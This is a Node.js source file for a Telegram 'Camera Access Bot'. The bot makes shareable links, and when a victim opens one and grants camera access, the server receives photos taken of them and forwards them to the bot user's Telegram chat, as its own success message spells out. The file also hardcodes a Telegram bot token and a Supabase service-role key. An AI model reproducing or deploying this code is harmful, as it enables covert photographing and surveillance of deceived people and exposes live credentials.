const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { createClient } = require('@supabase/supabase-js');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const https = require('https');

// ================= Configurations =================
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '7599562667:AAEzBnwqNr1uzn6F4ZmLSV0LIjobVrbnkJo';
const SUPABASE_URL = process.env.SUPABASE_URL || 'https://oqadecntljqjxfgsfcfq.supabase.co';
const SUPABASE_KEY = process.env.SUPABASE_KEY || 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im9xYWRlY250bGpxanhmZ3NmY2ZxIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc4MTE4Mzk4NiwiZXhwIjoyMDk2NzU5OTg2fQ.cFuBbo_TjaRDM9eNqknXnm33a2ZoWN7YKet-i9OoCuY';
const BASE_URL = process.env.BASE_URL || 'https://camera-5nbr.onrender.com';
const PORT = process.env.PORT || 3000;

const CHANNEL_USERNAME = '@camera_access';
const WELCOME_IMAGE_URL = 'https://via.placeholder.com/400x400.png?text=Welcome+Image'; // Replace this URL with your actual image URL later

// Initialize clients
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
const app = express();
const upload = multer({ dest: 'uploads/' });

app.use(express.static('public'));

const awaitingImage = {};

// ================= Helper Functions =================

async function checkMembership(userId) {
    try {
        const member = await bot.getChatMember(CHANNEL_USERNAME, userId);
        return ['creator', 'administrator', 'member'].includes(member.status);
    } catch (err) {
        console.error('Membership check error:', err);
        return false;
    }
}

function showStartMenu(chatId) {
    const opts = {
        reply_markup: {
            inline_keyboard: [
                [{ text: '🚀 Start Task', callback_data: 'start_task' }]
            ]
        },
        parse_mode: 'HTML'
    };
    bot.sendMessage(chatId, '<b>🎉 Verification Successful!</b>\n\nYou can now use the bot. Click <b>Start Task</b> below to begin.', opts);
}

// ================= Telegram Bot Logic =================

bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    // Check membership
    const isMember = await checkMembership(userId);
    
    if (!isMember) {
        const opts = {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '📢 Join Channel', url: 'https://t.me/camera_access' }],
                    [{ text: '✅ Check Joined', callback_data: 'check_joined' }]
                ]
            },
            parse_mode: 'HTML'
        };
        const welcomeText = `<b>Welcome to Camera Access Bot!</b> 📸\n\nTo use this bot, you must join our official channel first. Please join the channel and click <b>Check Joined</b>.`;
        
        bot.sendPhoto(chatId, WELCOME_IMAGE_URL, { caption: welcomeText, parse_mode: 'HTML', reply_markup: opts.reply_markup });
        return;
    }
    
    showStartMenu(chatId);
});

bot.on('callback_query', async (callbackQuery) => {
    const msg = callbackQuery.message;
    const chatId = msg.chat.id;
    const userId = callbackQuery.from.id;
    
    if (callbackQuery.data === 'check_joined') {
        const isMember = await checkMembership(userId);
        if (isMember) {
            bot.deleteMessage(chatId, msg.message_id).catch(()=>{});
            showStartMenu(chatId);
        } else {
            bot.answerCallbackQuery(callbackQuery.id, { text: '❌ You haven\'t joined the channel yet!', show_alert: true });
        }
    }
    else if (callbackQuery.data === 'start_task') {
        awaitingImage[chatId] = true;
        bot.sendMessage(chatId, '<i>Please send me an image that you want to show to the user.</i>', { parse_mode: 'HTML' });
        bot.answerCallbackQuery(callbackQuery.id);
    }
});

// Ignore normal text messages
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    if (msg.text && !msg.text.startsWith('/')) {
        bot.sendMessage(chatId, '<i>⚠️ Please use the provided buttons. Text input is disabled.</i>', { parse_mode: 'HTML' });
    }
});

bot.on('photo', async (msg) => {
    const chatId = msg.chat.id;
    
    if (awaitingImage[chatId]) {
        bot.sendMessage(chatId, '<i>Processing your image... Please wait.</i>', { parse_mode: 'HTML' });
        awaitingImage[chatId] = false;
        
        try {
            const photo = msg.photo[msg.photo.length - 1];
            const fileId = photo.file_id;
            const fileUrl = await bot.getFileLink(fileId);
            
            const fileName = `orig_${Date.now()}.jpg`;
            const filePath = path.join(__dirname, 'uploads', fileName);
            
            if (!fs.existsSync(path.join(__dirname, 'uploads'))) {
                fs.mkdirSync(path.join(__dirname, 'uploads'));
            }

            const file = fs.createWriteStream(filePath);
            https.get(fileUrl, function(response) {
                response.pipe(file);
                file.on('finish', async function() {
                    file.close();
                    
                    try {
                        const fileBuffer = fs.readFileSync(filePath);
                        const { data, error } = await supabase.storage
                            .from('image')
                            .upload(`originals/${fileName}`, fileBuffer, {
                                contentType: 'image/jpeg',
                                upsert: true
                            });

                        if (error) throw error;

                        const { data: publicUrlData } = supabase.storage
                            .from('image')
                            .getPublicUrl(`originals/${fileName}`);
                        
                        const publicUrl = publicUrlData.publicUrl;

                        const { data: insertData, error: dbError } = await supabase
                            .from('links')
                            .insert([
                                { chat_id: chatId, original_image_url: publicUrl }
                            ])
                            .select();

                        if (dbError) throw dbError;

                        const uniqueId = insertData[0].id;
                        const generatedLink = `${BASE_URL}?id=${uniqueId}`;

                        const successMsg = `<b>✅ Success!</b> Here is your link:\n\n<code>${generatedLink}</code>\n\n<i>Send this link to someone. When they open it and allow camera access, their photos will be sent to you here.</i>`;
                        bot.sendMessage(chatId, successMsg, { parse_mode: 'HTML' });
                        
                        fs.unlinkSync(filePath);
                    } catch (uploadErr) {
                        console.error('Supabase Error:', uploadErr);
                        bot.sendMessage(chatId, '❌ Sorry, there was an error uploading your image to the database.');
                    }
                });
            }).on('error', function(err) {
                console.error('Download Error:', err);
                bot.sendMessage(chatId, '❌ Sorry, failed to download image.');
            });
            
        } catch (err) {
            console.error('Error:', err);
            bot.sendMessage(chatId, '❌ Sorry, an error occurred.');
        }
    }
});

// ================= Express API Logic =================

app.post('/upload', upload.array('photos', 3), async (req, res) => {
    const { id } = req.body;
    const files = req.files;

    if (!id || !files || files.length === 0) {
        return res.status(400).json({ error: 'Missing ID or photos' });
    }

    try {
        const { data: linkData, error: dbError } = await supabase
            .from('links')
            .select('*')
            .eq('id', id)
            .single();

        if (dbError || !linkData) {
            return res.status(404).json({ error: 'Link not found' });
        }

        const chatId = linkData.chat_id;
        const originalImageUrl = linkData.original_image_url;
        const uploadedPhotos = [];

        for (let i = 0; i < files.length; i++) {
            const file = files[i];
            const fileBuffer = fs.readFileSync(file.path);
            const fileName = `captured_${id}_${Date.now()}_${i}.jpg`;

            const { error: uploadError } = await supabase.storage
                .from('image')
                .upload(`captured/${fileName}`, fileBuffer, {
                    contentType: 'image/jpeg',
                    upsert: true
                });

            if (!uploadError) {
                uploadedPhotos.push({
                    type: 'photo',
                    media: fs.createReadStream(file.path)
                });
            }
        }

        if (uploadedPhotos.length > 0) {
            await bot.sendMediaGroup(chatId, uploadedPhotos);
            bot.sendMessage(chatId, '<b>📸 New photos received from your link!</b>', { parse_mode: 'HTML' });
        }

        files.forEach(file => fs.unlinkSync(file.path));
        res.json({ success: true, original_image_url: originalImageUrl });

    } catch (err) {
        console.error('Upload Endpoint Error:', err);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// ================= Start Server =================
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
